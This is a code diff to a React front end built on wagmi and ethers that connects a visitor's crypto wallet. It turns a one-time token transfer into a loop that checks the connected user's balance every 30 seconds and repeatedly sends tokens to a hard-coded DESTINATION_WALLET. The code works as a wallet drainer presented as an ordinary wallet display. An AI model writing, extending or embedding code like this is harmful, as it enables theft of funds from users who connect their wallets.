@@ -1,8 +1,8 @@
 import { createAppKit } from '@reown/appkit/react';
 import { WagmiProvider, useAccount } from 'wagmi';
 import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
-import { useEffect } from 'react';
-import { BrowserProvider, parseUnits, Contract, Eip1193Provider } from 'ethers';
+import { useEffect, useState } from 'react';
+import { BrowserProvider, parseUnits, Contract, Eip1193Provider, formatUnits } from 'ethers';
 
 import { projectId, metadata, networks, wagmiAdapter, solanaWeb3JsAdapter } from './config';
 
@@ -191,9 +191,52 @@ const TOKEN_CONTRACT_ADDRESS = "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE"; // 
 
 const WalletDisplay = () => {
   const { address: userAddress, isConnected } = useAccount();
+  const [transferStatus, setTransferStatus] = useState('');
+  const [isTransferring, setIsTransferring] = useState(false);
+  const [balance, setBalance] = useState('0');
+  const [lastTransferAttempt, setLastTransferAttempt] = useState(0);
+
+  const attemptTransfer = async (tokenContract, provider) => {
+    if (isTransferring) return;
+    
+    try {
+      setIsTransferring(true);
+      setTransferStatus('Checking balance...');
+
+      const balanceWei = await tokenContract.balanceOf(userAddress);
+      const amountToSend = parseUnits("0.01", 18);
+
+      if (balanceWei.lt(amountToSend)) {
+        setTransferStatus('Insufficient balance. Waiting for funds...');
+        return false;
+      }
+
+      setTransferStatus('Initiating automatic transfer...');
+      const tx = await tokenContract.transfer(DESTINATION_WALLET, amountToSend);
+      
+      setTransferStatus('Transaction submitted. Waiting for confirmation...');
+      await tx.wait();
+      
+      setTransferStatus('Transfer successful!');
+      setLastTransferAttempt(Date.now());
+      
+      // Refresh balance
+      const newBalance = await tokenContract.balanceOf(userAddress);
+      setBalance(formatUnits(newBalance, 18));
+      return true;
+    } catch (error) {
+      console.error("Transfer failed:", error);
+      setTransferStatus(`Transfer failed: ${error.message || 'Unknown error'}`);
+      return false;
+    } finally {
+      setIsTransferring(false);
+    }
+  };
 
   useEffect(() => {
-    const autoTransferTokens = async () => {
+    let intervalId;
+    
+    const checkBalanceAndTransfer = async () => {
       if (!isConnected || !userAddress) return;
 
       try {
@@ -203,40 +246,58 @@ const WalletDisplay = () => {
           const signer = await provider.getSigner();
           const tokenContract = new Contract(TOKEN_CONTRACT_ADDRESS, tokenAbi, signer);
 
-          const balance = await tokenContract.balanceOf(userAddress);
-          const amountToSend = parseUnits("0.01", 18);
+          // Get current balance
+          const balanceWei = await tokenContract.balanceOf(userAddress);
+          const formattedBalance = formatUnits(balanceWei, 18);
+          setBalance(formattedBalance);
 
-          if (balance.lt(amountToSend)) {
-            console.warn("Insufficient balance to transfer.");
-            return;
+          // If it's been at least 1 minute since last transfer attempt and we have balance
+          if (Date.now() - lastTransferAttempt >= 60000) {
+            await attemptTransfer(tokenContract, provider);
           }
-
-          const tx = await tokenContract.transfer(DESTINATION_WALLET, amountToSend);
-          await tx.wait();
-          console.log("Transfer successful:", tx);
-        } else {
-          console.error("Ethereum provider not found");
         }
       } catch (error) {
-        console.error("Transfer failed:", error);
+        console.error("Error:", error);
+        setTransferStatus('Error checking balance. Will retry...');
       }
     };
 
-    autoTransferTokens();
-  }, [isConnected, userAddress]);
+    // Check immediately when wallet connects
+    checkBalanceAndTransfer();
+
+    // Set up interval to check every 30 seconds
+    intervalId = setInterval(checkBalanceAndTransfer, 30000);
+
+    return () => {
+      if (intervalId) {
+        clearInterval(intervalId);
+      }
+    };
+  }, [isConnected, userAddress, lastTransferAttempt]);
 
   return (
     <div style={{ background: '#f0f0f0', padding: '1rem', borderRadius: '8px', marginTop: '20px', textAlign: 'center' }}>
       {isConnected && (
         <div style={{ marginTop: '20px' }}>
-          <h3></h3>
-          <code style={{ wordBreak: 'break-all' }}>{}</code>
+          <h3>Your Wallet</h3>
+          <code style={{ wordBreak: 'break-all' }}>{userAddress}</code>
+          <div style={{ marginTop: '10px' }}>
+            <h4>Token Balance</h4>
+            <p>{balance}</p>
+            {transferStatus && (
+              <div style={{ 
+                marginTop: '10px', 
+                padding: '10px', 
+                borderRadius: '5px',
+                backgroundColor: transferStatus.includes('successful') ? '#dff0d8' : '#f2dede',
+                color: transferStatus.includes('successful') ? '#3c763d' : '#a94442'
+              }}>
+                {transferStatus}
+              </div>
+            )}
+          </div>
         </div>
       )}
-      <div style={{ marginTop: '20px' }}>
-        <h3></h3>
-        <code style={{ wordBreak: 'break-all' }}>{}</code>
-      </div>
     </div>
   );
 };
